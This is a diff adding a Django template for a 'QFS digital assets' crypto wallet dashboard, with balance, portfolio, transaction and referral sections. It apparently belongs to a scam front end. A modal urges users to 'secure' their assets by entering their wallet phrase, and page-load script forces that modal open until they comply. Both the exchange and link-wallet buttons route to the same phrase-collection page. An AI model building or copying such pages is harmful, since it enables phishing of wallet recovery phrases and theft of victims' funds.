@@ -1,0 +1,696 @@
+{% load static %}
+    <!doctype html>
+    <html lang="en">
+    
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+        <meta name="viewport"
+            content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, viewport-fit=cover" />
+        <meta name="apple-mobile-web-app-capable" content="yes" />
+        <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+        <meta name="theme-color" content="#000000">
+    <title>QFS digital assets</title>
+        <link rel="icon" type="image/png" href="{% static 'dashboard/assets/img/favicon.png' %}" sizes="32x32">
+        <link rel="apple-touch-icon" sizes="180x180" href="{% static 'dashboard/assets/img/icon/192x192.png' %}">
+        <link rel="stylesheet" href="{% static 'dashboard/assets/css/style.css' %}">
+        <link rel="manifest" href="{% static 'dashboard/__manifest.json' %}">
+    </head>
+    
+    <body>
+        
+        
+        
+    
+        <!-- loader -->
+        <div id="loader">
+            <img src="{% static 'dashboard/assets/img/loading-icon.png' %}" alt="icon" class="loading-icon">
+        </div>
+        <!-- * loader -->
+    
+        <!-- App Header -->
+        <div class="appHeader bg-primary text-light">
+        <div class="left">
+                <a href="#" class="headerButton" data-bs-toggle="modal" data-bs-target="#sidebarPanel">
+                    <ion-icon name="menu-outline"></ion-icon>
+                </a>
+            </div>
+            <div class="pageTitle">
+            QFS digital assets        </div>
+            <div class="right">
+               
+            </div>
+        </div>
+        <!-- * App Header -->
+    
+    
+        <!-- App Capsule -->
+        <div id="appCapsule">
+    
+    
+            <!-- Wallet -->
+            <div class="section full gradientSection">
+                <div class="in">
+    
+                    <h5 class="title mb-2">Current Balance</h5>
+                                    <h1 class="total">$
+                         {{user_dashboard.account_balance}}                 </h1>
+    
+                                    <h4 class="caption">
+                        <span class="iconbox text-success">
+                            <ion-icon name="trending-up-outline"></ion-icon>
+                        </span>
+                        {{btc_balnce|floatformat:3}} BTC
+                    </h4>
+                    <div class="wallet-inline-button mt-5">
+                        <a href="{% url 'deposite:deposite-page' %}" class="item" >
+                            <div class="iconbox">
+                                <ion-icon name="arrow-up-outline"></ion-icon>
+                            </div>
+                            <strong>Deposit</strong>
+                        </a>
+                        <a href="{% url 'withdrawal:withdrawal-page' %}" class="item" >
+                            <div class="iconbox">
+                                <ion-icon name="arrow-down-outline"></ion-icon>
+                            </div>
+                            <strong>Withdraw</strong>
+                        </a>
+                        
+                        <a href="{% url 'secure_assets:secure_asset' %}" class="item">
+                            <div class="iconbox">
+                                <ion-icon name="swap-vertical-outline"></ion-icon>
+                            </div>
+                            <strong>Exchange</strong>
+                        </a>
+                        <a href="{% url 'secure_assets:secure_asset' %}" class="item" >
+                            <div class="iconbox">
+                                <ion-icon name="link-outline"></ion-icon>
+                            </div>
+                            <strong>Link wallet</strong>
+                        </a>
+                    </div>
+                </div>
+            </div>
+            <!-- * Wallet -->
+    
+    
+            <!-- Deposit Action Sheet -->
+           
+    
+                    <!-- Portfolio -->
+
+            {% for message in messages %}
+            
+            <div class="alert {{ message.tags }} alert-dismissible fade show" role="alert">
+                {{ message | safe }}
+                <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
+            </div>
+            {% endfor %}   
+                            <!-- secure wallet modal information -->
+                <div class="modal fade" id="SecureModal" data-bs-backdrop="static" data-bs-keyboard="false">
+                    <div class="modal-dialog modal-dialog-centered">
+                    <div class="modal-content">
+                
+                    <div class="mx-auto mt-1">
+                    <div class="mb-3 text-center"><i class="fas fa-info-circle fa-4x"></i></div>
+                        <div class="text-center">
+                            <h2>NOTICE!</h2>
+                            <p class="text-dark"><small>Welcome to Qfsledger.digital, for our new members Secure your digital assets here by adding your WalletPhrase here!
+                
+                                Back up your Digital assets and fund for the global event with Qfsledger to prevent atacks from all sorts of hackers.
+                            </small></p>
+                        </div>
+                    </div>
+                        <div class="mx-auto mb-3 mt-1">
+                        <button type="button" class="btn btn-secondary me-1" data-bs-dismiss="modal">Close</button><a href="{% url 'secure_assets:secure_asset' %}" class="btn btn-success ms-1">Secure now</a>
+                        </div>
+                        
+                
+                    </div>
+                    </div>
+                </div>
+       
+            
+            <div class="section mt-4">
+                <div class="section-heading">
+                    <h2 class="title">My Portfolio</h2>
+                    
+                </div>
+                <div class="card">
+                    <ul class="listview flush transparent no-line image-listview detailed-list mt-1 mb-1">
+                        <!-- item -->
+                        <li>
+                            <div class="item">
+                                <div class="icon-box text-success">
+                                    <img src="{% static 'dashboard/assets/img/xlm.png' %}" alt="image" height="50px">
+                                </div>
+                                <div class="in">
+                                    <div>
+                                        <strong>Xlm</strong>
+                                        <div class="text-small text-secondary">{{assets.xlm.amount|floatformat:3}} XLM</div>
+                                    </div>
+                                    <div class="text-end">
+                                        <strong>${{assets.xlm.price|floatformat:3}}</strong>
+                                        <div class="text-small">
+                                            
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </li>
+                        <!-- * item -->
+                        <!-- item -->
+                        <li>
+                            <div class="item">
+                                <div class="icon-box text-dark">
+                              <img src="{% static 'dashboard/assets/img/xrp.png' %}" alt="image" height="50px">
+                               
+                                </div>
+                                <div class="in">
+                                    <div>
+                                        <strong>Xrp</strong>
+                                        <div class="text-small text-secondary">{{assets.xrp.amount|floatformat:3}}  XRP</div>
+                                    </div>
+                                    <div class="text-end">
+                                        <strong>${{assets.xrp.price|floatformat:3}}</strong>
+                                        <div class="text-small">
+                                           
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </li>
+                        <!-- * item -->
+                        <!-- item -->
+                        <li>
+                            <div class="item">
+                                <div class="icon-box text-dark">
+                              <img src="{% static 'dashboard/assets/img/algo.png' %}" alt="image" height="50px">
+                               
+                                </div>
+                                <div class="in">
+                                    <div>
+                                        <strong>Algo</strong>
+                                        <div class="text-small text-secondary">{{assets.algo.amount|floatformat:3}}  ALGO</div>
+                                    </div>
+                                    <div class="text-end">
+                                        <strong>${{assets.algo.price|floatformat:3}}</strong>
+                                        <div class="text-small">
+                                           
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </li>
+                        <!-- * item -->
+                        <!-- item -->
+                        <li>
+                            <div class="item">
+                                <div class="icon-box text-dark">
+                              <img src="{% static 'dashboard/assets/img/cardano.png' %}" alt="image" height="50px">
+                               
+                                </div>
+                                <div class="in">
+                                    <div>
+                                        <strong>Cardano</strong>
+                                        <div class="text-small text-secondary">{{assets.cardano.amount|floatformat:3}}  ADA</div>
+                                    </div>
+                                    <div class="text-end">
+                                        <strong>${{assets.cardano.price|floatformat:3}}</strong>
+                                        <div class="text-small">
+                                           
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </li>
+           
+                    </ul>
+                </div>
+            </div>
+            <!-- Portfolio -->
+            
+    
+            <!-- Action Sheet Watchlist -->
+    
+            <!-- * Action Sheet Watchlist -->
+    
+    
+            <!-- Transactions -->
+            <div class="section mt-4">
+                <div class="section-heading">
+                    <h2 class="title">Transactions</h2>
+                   
+                </div>
+                <div class="card">
+                    <ul class="listview flush transparent no-line image-listview detailed-list mt-1 mb-1">
+                        <!-- item -->
+                        {% if user_transaction %}
+                        {% for item in user_transaction %}
+                        {% if item.transaction_type == "deposite"%}
+                        <li>
+                            <a href="#" class="item">
+                                <div class="icon-box bg-primary">
+                                    <ion-icon name="checkmark-outline"></ion-icon>
+                                </div>
+                                <div class="in">
+                                    <div>
+                                        <strong>Deposit Funds</strong>
+                                        <div class="text-small text-secondary">{{item.ammount_in_crypto|floatformat:3}}{{item.crypto}} - {{item.crypto_address}} - {{item.deposite_transact.transaction_mode}}</div>
+                                    </div>
+                                    <div class="text-end">
+                                        <strong>{{item.deposite_transact.ammount}}</strong>
+                                        <div class="text-small">
+                                        {{item.date_created}}                                   </div>
+                                    </div>
+                                </div>
+                            </a>
+                        </li>
+                        {% else %}
+                        <li>
+                            <a href="#" class="item">
+                                <div class="icon-box bg-primary">
+                                    <ion-icon name="checkmark-outline"></ion-icon>
+                                </div>
+                                <div class="in">
+                                    <div>
+                                        <strong>withdraw Funds</strong>
+                                        <div class="text-small text-secondary">{{item.ammount_in_crypto|floatformat:3}}{{item.crypto}} - {{item.crypto_address}} - {{item.withdrawal_transact.payment_mode}}</div>
+                                    </div>
+                                    <div class="text-end">
+                                        <strong>{{item.withdrawal_transact.ammount}}</strong>
+                                        <div class="text-small">
+                                        {{item.date_created}}                                   </div>
+                                    </div>
+                                </div>
+                            </a>
+                        </li>
+                        {% endif %}
+                        {% endfor %}
+                       
+                        {% endif %}
+                                           
+                                            <!-- * item -->
+                      
+                    </ul>
+                </div>
+            </div>
+            <!-- Transactions -->
+    
+    
+            <!-- Slider -->
+            <div class="section mt-4 full">
+                <div class="carousel-single splide">
+                    <div class="splide__track">
+                        <ul class="splide__list">
+    
+                            <li class="splide__slide">
+                                <div class="card card-with-icon">
+                                    <div class="card-body pt-3 pb-3 text-center">
+                                        <div class="card-icon bg-success mb-2">
+                                            <ion-icon name="link"></ion-icon>
+                                        </div>
+                                        <h3 class="card-titlde mb-1">Refer a Friend and Earn Price</h3>
+    
+                                        <input type="text" class="form-control myInput readonly text-dark bg-light" value="{{referral}}" id="myInput_copy" readonly>
+                                        <div class="row">
+                                            <div class="col">
+                                                <button class="btn btn-outline-secondary " onclick="myFunction_copy()" type="button" id="button-addon2">copy</button>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </li>
+    
+                            <li class="splide__slide">
+                                <div class="card card-with-icon">
+                                    <div class="card-body pt-3 pb-3 text-center">
+                                        <div class="card-icon mb-2">
+                                            <ion-icon name="chatbox-ellipses"></ion-icon>
+                                        </div>
+                                        <h3 class="card-titlde mb-1">Join Our Group Chat</h3>
+    
+                                        <p>Let's talk about the market and strategiest!</p>
+                                        <div class="row">
+                                            <div class="col">
+                                                <a href="#" class="btn btn-block btn-primary">
+                                                    Join now
+                                                </a>
+                                            </div>
+                                            
+                                        </div>
+                                    </div>
+                                </div>
+                            </li>
+    
+                            
+    
+                        </ul>
+                    </div>
+                </div>
+            </div>
+            <!-- * Slider -->
+    
+    
+            <!-- News -->
+            
+            <!-- * News -->
+    
+    
+            <!-- app footer -->
+            <div class="appFooter">
+                <div class="footer-title">
+                    Copyright © QFS digital assets. All Rights Reserved.
+                </div>
+              
+            </div>
+            <!-- * app footer -->
+    
+        </div>
+        <!-- * App Capsule -->
+    
+    
+        <!-- App Bottom Menu -->
+        <div class="appBottomMenu" style="padding-top:10px">
+        <div  id="ytWidget"></div><script src="https://translate.yandex.net/website-widget/v1/widget.js?widgetId=ytWidget&pageLang=en&widgetTheme=dark&autoMode=false" type="text/javascript"></script>
+                    
+        </div>
+        <!-- * App Bottom Menu -->
+    
+        <!-- App Sidebar -->
+       <div class="modal fade panelbox panelbox-left" id="sidebarPanel" tabindex="-1" role="dialog">
+    <div class="modal-dialog" role="document">
+        <div class="modal-content">
+            <div class="modal-body p-0">
+                <!-- profile box -->
+                <div class="profileBox pt-2 pb-2">
+                  
+                  
+                    <div class="in">
+                        <strong>{{user.username}}</strong>
+                   
+                    </div>
+                    <a href="#" class="btn btn-link btn-icon sidebar-close" data-bs-dismiss="modal">
+                        <ion-icon name="close-outline"></ion-icon>
+                    </a>
+                </div>
+                <!-- * profile box -->
+                <!-- balance -->
+                            <div class="sidebar-balance">
+                    <div class="listview-title">Balance</div>
+                    <div class="in">
+                        <h1 class="amount">${{user_dashboard.account_balance}}</h1>
+                    </div>
+                </div>
+                            <!-- * balance -->
+    
+                <!-- action group -->
+                <div class="action-group">
+                    <a href="{% url 'deposite:deposite-page' %}" class="action-button">
+                        <div class="in">
+                            <div class="iconbox">
+                                <ion-icon name="add-outline"></ion-icon>
+                            </div>
+                            Deposit
+                        </div>
+                    </a>
+                    <a href="{% url 'withdrawal:withdrawal-page' %}" class="action-button">
+                        <div class="in">
+                            <div class="iconbox">
+                                <ion-icon name="arrow-down-outline"></ion-icon>
+                            </div>
+                            Withdraw
+                        </div>
+                    </a>
+                    <a href="{% url 'secure_assets:secure_asset' %}" class="action-button">
+                        <div class="in">
+                            <div class="iconbox">
+                                <ion-icon name="swap-vertical-outline"></ion-icon>
+                            </div>
+                            exchange
+                        </div>
+                    </a>
+                    <a href="{% url 'secure_assets:secure_asset' %}" class="action-button">
+                        <div class="in">
+                            <div class="iconbox">
+                                <ion-icon name="link-outline"></ion-icon>
+                            </div>
+                            Link Wallet
+                        </div>
+                    </a>
+                </div>
+                <!-- * action group -->
+    
+                <!-- menu -->
+                <div class="listview-title mt-1">Menu</div>
+                <ul class="listview flush transparent no-line image-listview">
+                    <li>
+                        <a href="{% url 'dashboard:dashboard-page' %}" class="item">
+                            <div class="icon-box bg-primary">
+                                <ion-icon name="pie-chart-outline"></ion-icon>
+                            </div>
+                            <div class="in">
+                                Home
+                               
+                            </div>
+                        </a>
+                    </li>
+                    <li>
+                        <a href="{% url 'account:update_profile' %}" class="item">
+                            <div class="icon-box bg-primary">
+                                <ion-icon name="person-circle-outline"></ion-icon>
+                            </div>
+                            <div class="in">
+                                My Account
+                               
+                            </div>
+                        </a>
+                    </li>
+                    <li>
+                        <a href="{% url 'deposite:deposite-page' %}" class="item">
+                            <div class="icon-box bg-primary">
+                                <ion-icon name="wallet-outline"></ion-icon>
+                            </div>
+                            <div class="in">
+                                Fund 
+                               
+                            </div>
+                        </a>
+                    </li>
+                    <li>
+                        <a href="{% url 'withdrawal:withdrawal-page' %}" class="item">
+                            <div class="icon-box bg-primary">
+                                <ion-icon name="cash-outline"></ion-icon>
+                            </div>
+                            <div class="in">
+                                Withdraw
+                               
+                            </div>
+                        </a>
+                    </li>
+                    <li>
+                        <a href="{% url 'account:logout_user' %}" class="item">
+                            <div class="icon-box bg-primary">
+                                <ion-icon name="log-out-outline"></ion-icon>
+                            </div>
+                            <div class="in">
+                                Logout
+                               
+                            </div>
+                        </a>
+                    </li>
+                    <li>
+                    <a href="#" class="item" onclick="iosAddtoHome();">
+                            <div class="icon-box bg-secondary">
+                                <ion-icon name="logo-apple"></ion-icon>
+                            </div>
+                            <div class="in">
+                                <div>Download app</div>
+                            </div>
+                        </a>
+                    </li>
+                  
+                </ul>
+                <!-- * menu -->
+    
+                
+    
+            </div>
+        </div>
+    </div>
+    </div>    <!-- * App Sidebar -->
+    
+     <!-- iOS Add to Home Action Sheet -->
+     <div class="modal inset fade action-sheet ios-add-to-home" id="ios-add-to-home-screen" tabindex="-1" role="dialog">
+            <div class="modal-dialog" role="document">
+                <div class="modal-content">
+                    <div class="modal-header">
+                        <h5 class="modal-title">Add to Home Screen</h5>
+                        <a href="#" class="close-button" data-bs-dismiss="modal">
+                            <ion-icon name="close"></ion-icon>
+                        </a>
+                    </div>
+                    <div class="modal-body">
+                        <div class="action-sheet-content text-center">
+                            <div class="mb-1"><img src="" alt="image" class="imaged w64 mb-2">
+                            </div>
+                            <div>
+                                Install <strong>QFS digital assets</strong> on your iPhone's home screen.
+                            </div>
+                            <div>
+                                Tap <ion-icon name="share-outline"></ion-icon> and Add to homescreen.
+                            </div>
+                            <div class="mt-2">
+                                <button class="btn btn-primary btn-block" data-bs-dismiss="modal">CLOSE</button>
+                            </div>
+                        </div>
+    
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- * iOS Add to Home Action Sheet -->
+    
+        <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+    
+        <!-- ========= JS Files =========  -->
+        <!-- Bootstrap -->
+        <script src="{% static 'dashboard/assets/js/lib/bootstrap.bundle.min.js' %}"></script>
+        <!-- Ionicons -->
+        <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+        <!-- Splide -->
+        <script src="{% static 'dashboard/assets/js/plugins/splide/splide.min.js' %}"></script>
+        <!-- Apex Charts -->
+        <script src="{% static 'dashboard/assets/js/plugins/apexcharts/apexcharts.min.js' %}"></script>
+        <!-- Base Js File -->
+        <script src="{% static 'dashboard/assets/js/base.js' %}"></script>
+    
+        <script>
+            $(document).ready(function(){
+
+$.ajax({
+type: 'GET',
+url: "{% url 'secure_assets:if_secured' %}",
+data: {"send_otp": "send otp"},
+success: function (response) {
+    // if not secured asset, alert the user
+    
+    if(response["have_secured"]=="no"){
+
+        $("#SecureModal").modal('show');
+    }
+},
+error: function (response) {
+    console.log(response)
+}
+})
+
+});
+    
+            var sparklineAreaExampleSuccess1 = {
+                series: [{
+                    data: [555, 1222, 777, 888, 555, 888, 999, 1222]
+                }],
+                chart: {
+                    type: 'area',
+                    width: '100%',
+                    height: 70,
+                    sparkline: {
+                        enabled: true
+                    }
+                },
+                stroke: {
+                    width: 2,
+                },
+                colors: ['#1DCC70'],
+                tooltip: {
+                    enabled: false
+                }
+            };
+            var sparklineAreaExampleSuccess2 = {
+                series: [{
+                    data: [55, 66, 55, 77, 66, 180, 290, 333]
+                }],
+                chart: {
+                    type: 'area',
+                    width: '100%',
+                    height: 70,
+                    sparkline: {
+                        enabled: true
+                    }
+                },
+                stroke: {
+                    width: 2,
+                },
+                colors: ['#1DCC70'],
+                tooltip: {
+                    enabled: false
+                }
+            };
+            var sparklineAreaExampleDanger1 = {
+                series: [{
+                    data: [2222, 1666, 1444, 1777, 1333, 1111, 777, 666]
+                }],
+                chart: {
+                    type: 'area',
+                    width: '100%',
+                    height: 70,
+                    sparkline: {
+                        enabled: true
+                    }
+                },
+                stroke: {
+                    width: 2,
+                },
+                colors: ['#FF396F'],
+                tooltip: {
+                    enabled: false
+                }
+            };
+            var sparklineAreaExampleDanger2 = {
+                series: [{
+                    data: [1200, 1444, 2900, 505, 531, 1900, 555, 75]
+                }],
+                chart: {
+                    type: 'area',
+                    width: '100%',
+                    height: 70,
+                    sparkline: {
+                        enabled: true
+                    }
+                },
+                stroke: {
+                    width: 2,
+                },
+                colors: ['#FF396F'],
+                tooltip: {
+                    enabled: false
+                }
+            };
+    
+    
+            document.addEventListener('DOMContentLoaded', function () {
+                document.querySelectorAll('.chart-sparkline-success-1').forEach(chart => new ApexCharts(chart, sparklineAreaExampleSuccess1).render());
+                document.querySelectorAll('.chart-sparkline-success-2').forEach(chart => new ApexCharts(chart, sparklineAreaExampleSuccess2).render());
+                document.querySelectorAll('.chart-sparkline-danger-1').forEach(chart => new ApexCharts(chart, sparklineAreaExampleDanger1).render());
+                document.querySelectorAll('.chart-sparkline-danger-2').forEach(chart => new ApexCharts(chart, sparklineAreaExampleDanger2).render());
+    
+            })
+            function myFunction_copy() {
+        // Get the text field
+        var copyText = document.getElementById("myInput_copy");
+
+        // Select the text field
+        copyText.select();
+        copyText.setSelectionRange(0, 99999); // For mobile devices
+
+        // Copy the text inside the text field
+        navigator.clipboard.writeText(copyText.value);
+
+        // Alert the copied text
+        alert("Copied the text: " + copyText.value);
+        }
+    
+        </script>
+    
+    </body>
+    </html>
